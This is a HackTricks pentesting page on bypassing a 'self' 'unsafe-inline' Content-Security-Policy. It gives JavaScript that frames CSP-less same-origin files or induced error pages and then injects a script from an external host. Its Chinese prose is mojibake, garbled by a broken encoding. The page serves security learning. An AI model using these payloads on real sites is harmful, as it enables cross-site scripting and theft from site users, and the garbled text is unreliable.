{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


ä¸€ä¸ªè¿™æ ·çš„é…ç½®:
```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```
ç¦æ­¢ä½¿ç”¨ä»»ä½•ä½œä¸ºå­—ç¬¦ä¸²ä¼ è¾“çš„ä»£ç æ‰§è¡Œå‡½æ•°ã€‚ä¾‹å¦‚ï¼š`eval, setTimeout, setInterval` éƒ½ä¼šå› ä¸ºè®¾ç½® `unsafe-eval` è€Œè¢«é˜»æ­¢ã€‚

æ¥è‡ªå¤–éƒ¨æ¥æºçš„ä»»ä½•å†…å®¹ä¹Ÿä¼šè¢«é˜»æ­¢ï¼ŒåŒ…æ‹¬å›¾åƒã€CSSã€WebSocketsï¼Œå°¤å…¶æ˜¯ JSã€‚

### é€šè¿‡æ–‡æœ¬å’Œå›¾åƒ

è§‚å¯Ÿåˆ°ç°ä»£æµè§ˆå™¨å°†å›¾åƒå’Œæ–‡æœ¬è½¬æ¢ä¸º HTML ä»¥å¢å¼ºå…¶æ˜¾ç¤ºæ•ˆæœï¼ˆä¾‹å¦‚ï¼Œè®¾ç½®èƒŒæ™¯ã€å±…ä¸­ç­‰ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœé€šè¿‡ `iframe` æ‰“å¼€å›¾åƒæˆ–æ–‡æœ¬æ–‡ä»¶ï¼Œä¾‹å¦‚ `favicon.ico` æˆ– `robots.txt`ï¼Œå®ƒä¼šè¢«å‘ˆç°ä¸º HTMLã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›é¡µé¢é€šå¸¸ç¼ºå°‘ CSP å¤´ï¼Œå¹¶ä¸”å¯èƒ½ä¸åŒ…å« X-Frame-Optionsï¼Œä»è€Œå…è®¸ä»ä¸­æ‰§è¡Œä»»æ„ JavaScriptï¼š
```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
### é€šè¿‡é”™è¯¯

ç±»ä¼¼åœ°ï¼Œé”™è¯¯å“åº”ï¼Œå¦‚æ–‡æœ¬æ–‡ä»¶æˆ–å›¾åƒï¼Œé€šå¸¸æ²¡æœ‰CSPå¤´ï¼Œå¹¶ä¸”å¯èƒ½çœç•¥X-Frame-Optionsã€‚å¯ä»¥è¯±å¯¼é”™è¯¯åœ¨iframeä¸­åŠ è½½ï¼Œä»è€Œå…è®¸ä»¥ä¸‹æ“ä½œï¼š
```javascript
// Inducing an nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Triggering an error with a long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Generating an error via extensive cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Removal of cookies is crucial post-execution
for(var i=0;i<5;i++){document.cookie=i+"="}
```
åœ¨è§¦å‘ä¸Šè¿°ä»»ä½•åœºæ™¯åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åœ¨iframeä¸­å®ç°JavaScriptæ‰§è¡Œï¼š
```javascript
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
## å‚è€ƒæ–‡çŒ®

* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
